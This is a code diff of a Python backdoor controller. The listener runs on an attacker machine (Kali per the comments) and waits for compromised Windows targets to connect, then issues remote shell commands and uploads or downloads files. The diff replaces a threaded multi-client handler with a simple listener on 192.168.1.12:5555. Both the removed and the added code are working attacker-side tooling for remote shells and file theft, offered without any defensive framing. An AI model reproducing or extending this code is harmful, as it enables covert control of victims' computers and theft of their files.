@@ -8,12 +8,9 @@ import socket  # This library is used for creating socket connections.
 import json  # JSON is used for encoding and decoding data in a structured format.
 import threading  # For proxy server
 import os  # For file operations
-import select  # For handling multiple sockets
-import time  # For timing operations
 
 # Import configuration
 from configuration import SERVER_IP, SERVER_PORT
-
 
 # Function to send data reliably as JSON-encoded strings
 def reliable_send(data):
@@ -66,96 +63,6 @@ def download_file(file_name):
     target.settimeout(None)
     # Close the local file after downloading is complete.
     f.close()
-
-
-# Multi-connection handler for backdoor clients
-def handle_backdoor_client(client_socket, client_address):
-    """Handle individual backdoor connection"""
-    client_id = f"{client_address[0]}:{client_address[1]}"
-    print(f'[+] Backdoor Client Connected: {client_id}')
-    
-    try:
-        # Create reliable send/recv functions for this client
-        def client_reliable_send(data):
-            jsondata = json.dumps(data)
-            client_socket.send(jsondata.encode())
-        
-        def client_reliable_recv():
-            data = ''
-            while True:
-                try:
-                    data = data + client_socket.recv(1024).decode().rstrip()
-                    return json.loads(data)
-                except ValueError:
-                    continue
-        
-        # Handle client communication
-        while True:
-            try:
-                command = input(f'* Shell~{client_id}: ')
-                
-                if not command:
-                    continue
-                
-                if command == 'quit':
-                    client_reliable_send('quit')
-                    break
-                
-                # Send command to client
-                client_reliable_send(command)
-                
-                # Handle different command types (same logic as main session)
-                if command.startswith('cd '):
-                    result = client_reliable_recv()
-                    print(result)
-                elif command.startswith('download '):
-                    filename = command[9:].strip()
-                    download_file_from_client(filename, client_socket)
-                elif command.startswith('upload '):
-                    filename = command[7:].strip()
-                    if filename and os.path.exists(filename):
-                        upload_file_to_client(filename, client_socket)
-                        result = client_reliable_recv()
-                        print(result)
-                    else:
-                        print(f"File not found: {filename}")
-                else:
-                    result = client_reliable_recv()
-                    print(f"Output:\n{result}")
-                    
-            except KeyboardInterrupt:
-                print(f"\nDisconnecting from {client_id}")
-                break
-            except Exception as e:
-                print(f"Error with client {client_id}: {e}")
-                break
-                
-    except Exception as e:
-        print(f'[!] Client {client_id} error: {e}')
-    finally:
-        client_socket.close()
-        print(f'[-] Client Disconnected: {client_id}')
-
-def download_file_from_client(file_name, client_socket):
-    """Download file from specific client"""
-    f = open(file_name, 'wb')
-    client_socket.settimeout(1)
-    chunk = client_socket.recv(1024)
-    while chunk:
-        f.write(chunk)
-        try:
-            chunk = client_socket.recv(1024)
-        except socket.timeout:
-            break
-    client_socket.settimeout(None)
-    f.close()
-
-def upload_file_to_client(file_name, client_socket):
-    """Upload file to specific client"""
-    f = open(file_name, 'rb')
-    client_socket.send(f.read())
-    f.close()
-
 
 # Function for the main communication loop with the target
 def target_communication():
@@ -390,101 +297,22 @@ def target_communication():
         else:
             # For other commands, receive and print the result from the target.
             result = reliable_recv()
-            print(f"Output:\n{result}")
+            print(result)
 
 
+# Create a socket for the server
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# Multi-connection server setup
-def start_multi_connection_server():
-    """Start server that can handle multiple backdoor connections"""
-    global target, ip
-    
-    # Create main server socket
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    sock.bind((SERVER_IP, SERVER_PORT))
-    sock.listen(10)  # Allow more concurrent connections
-    
-    print(f'[+] Multi-Connection Server Listening on {SERVER_IP}:{SERVER_PORT}')
-    print(f'[+] Ready for main backdoor and proxy connections')
-    
-    connection_count = 0
-    
-    try:
-        while True:
-            client_socket, client_address = sock.accept()
-            connection_count += 1
-            
-            if connection_count == 1:
-                # First connection becomes the main session
-                target = client_socket
-                ip = client_address
-                print(f'[+] Main Backdoor Connected: {client_address}')
-                print(f'[+] Starting main interactive session...')
-                
-                # Start main session in a separate thread
-                main_thread = threading.Thread(
-                    target=target_communication,
-                    daemon=False
-                )
-                main_thread.start()
-            else:
-                # Additional connections are handled as independent sessions
-                print(f'[+] Additional Connection #{connection_count}: {client_address}')
-                
-                # Handle each additional connection in its own thread
-                client_thread = threading.Thread(
-                    target=handle_backdoor_client,
-                    args=(client_socket, client_address),
-                    daemon=True
-                )
-                client_thread.start()
-                
-    except KeyboardInterrupt:
-        print("\n[!] Server shutting down...")
-    except Exception as e:
-        print(f"[!] Server error: {e}")
-    finally:
-        sock.close()
+# Bind the socket to a specific IP address ('192.168.1.12') and port (5555).
+sock.bind(('192.168.1.12', 5555))
 
-def start_simple_server():
-    """Start simple server - no proxy servers needed on Kali side"""
-    print("[+] Starting Simple Server Architecture")
-    print(f"[+] Main Server: {SERVER_IP}:{SERVER_PORT}")
-    print(f"[+] Proxy: Windows opens permanent port directly (no Kali proxy needed)")
-    
-    # Start main server (blocking)
-    start_main_server()
+# Start listening for incoming connections (maximum 5 concurrent connections).
+print('[+] Listening For The Incoming Connections')
+sock.listen(5)
 
-# Removed complex proxy server functions - not needed for simple approach
-# Windows opens permanent port directly, no Kali proxy servers required
+# Accept incoming connection from the target and obtain the target's IP address.
+target, ip = sock.accept()
+print('[+] Target Connected From: ' + str(ip))
 
-def start_main_server():
-    """Start main backdoor server on port 5555"""
-    global target, ip
-    
-    # Create main server socket
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    sock.bind((SERVER_IP, SERVER_PORT))
-    sock.listen(5)
-    
-    print(f'[+] Main Backdoor Server Listening on {SERVER_IP}:{SERVER_PORT}')
-    
-    try:
-        # Accept main backdoor connection
-        target, ip = sock.accept()
-        print(f'[+] Main Backdoor Connected: {ip}')
-        
-        # Start main interactive session
-        target_communication()
-                
-    except KeyboardInterrupt:
-        print("\\n[!] Main server shutting down...")
-    except Exception as e:
-        print(f"[!] Main server error: {e}")
-    finally:
-        sock.close()
-
-if __name__ == "__main__":
-    start_simple_server()
+# Start the main communication loop with the target by calling target_communication.
+target_communication()
